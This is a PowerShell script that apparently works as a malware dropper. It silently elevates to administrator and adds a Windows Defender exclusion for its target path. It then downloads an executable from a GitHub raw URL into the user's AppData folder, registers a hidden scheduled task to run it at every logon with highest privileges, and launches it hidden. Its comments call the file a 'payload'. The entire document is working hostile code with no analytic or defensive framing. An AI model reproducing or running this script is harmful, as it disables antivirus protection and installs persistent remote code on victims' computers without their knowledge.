param(
    [string]$OriginalTemp = $env:TEMP,
    [string]$FileName = "cf.exe",
    [string]$RepoUrl = "https://github.com/monkbytting/client/raw/main"
)

# Silent logging to file only
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message" -ErrorAction SilentlyContinue
}

# Check for admin privileges and elevate if needed (mandatory for Defender exclusion and scheduled task)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Log "Elevating to admin privileges (required for Defender exclusion and scheduled task)..."
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`" -FileName `"$FileName`" -RepoUrl `"$RepoUrl`""
    try {
        (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe', $elevatedCommand, '', 'runas', 0)
        exit
    }
    catch {
        Write-Log "Failed to elevate privileges: $_"
        throw "Admin elevation failed. Defender exclusion and scheduled task require admin rights."
    }
}

# Main execution block
try {
    Write-Log "Starting execution..."

    # Use user-specific persistent location
    $persistentDir = "$env:APPDATA\CustomApp"  # e.g., C:\Users\<YourUsername>\AppData\Roaming\CustomApp
    $output = Join-Path $persistentDir $FileName  # e.g., C:\Users\<YourUsername>\AppData\Roaming\CustomApp\cf.exe
    Write-Log "Target path: $output"

    # Ensure persistent directory exists
    if (-not (Test-Path $persistentDir)) {
        Write-Log "Creating directory: $persistentDir"
        try {
            New-Item -Path $persistentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            Write-Log "Directory created successfully."
        }
        catch {
            Write-Log "Failed to create directory: $_"
            throw "Directory creation failed."
        }
    }

    # Add Windows Defender exclusion (priority, requires admin)
    if ((Get-MpPreference).ExclusionPath -notcontains $output) {
        Write-Log "Adding exclusion to Windows Defender: $output"
        try {
            Add-MpPreference -ExclusionPath $output -ErrorAction Stop
            Write-Log "Defender exclusion added successfully."
        }
        catch {
            Write-Log "Failed to add Defender exclusion: $_"
            throw "Defender exclusion failed."
        }
    }

    # Download the payload if it doesn’t already exist
    if (-not (Test-Path $output)) {
        $downloadUrl = "$RepoUrl/Cbuilt.exe"
        Write-Log "Downloading from: $downloadUrl"
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction SilentlyContinue
    }

    # Verify file exists
    if (Test-Path $output) {
        Write-Log "File present at: $output"

        # Add to startup via Scheduled Task (UAC bypass, requires admin for initial setup)
        if (-not (Get-ScheduledTask -TaskName "CustomAppLauncher" -ErrorAction SilentlyContinue)) {
            Write-Log "Creating scheduled task for startup..."
            try {
                $action = New-ScheduledTaskAction -Execute $output
                $trigger = New-ScheduledTaskTrigger -AtLogOn
                $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfIdle:$false -IdleDuration "00:00:00" -IdleWaitTimeout "00:00:00"
                Register-ScheduledTask -TaskName "CustomAppLauncher" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
                Write-Log "Scheduled task created successfully."
            }
            catch {
                Write-Log "Failed to create scheduled task: $_"
                throw "Scheduled task creation failed."
            }
        }

        # Execute immediately
        Write-Log "Executing: $output"
        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    else {
        Write-Log "File not found after download attempt."
    }
}
catch {
    Write-Log "Error occurred: $_"
    throw "Script failed: Check runner.log for details."
}
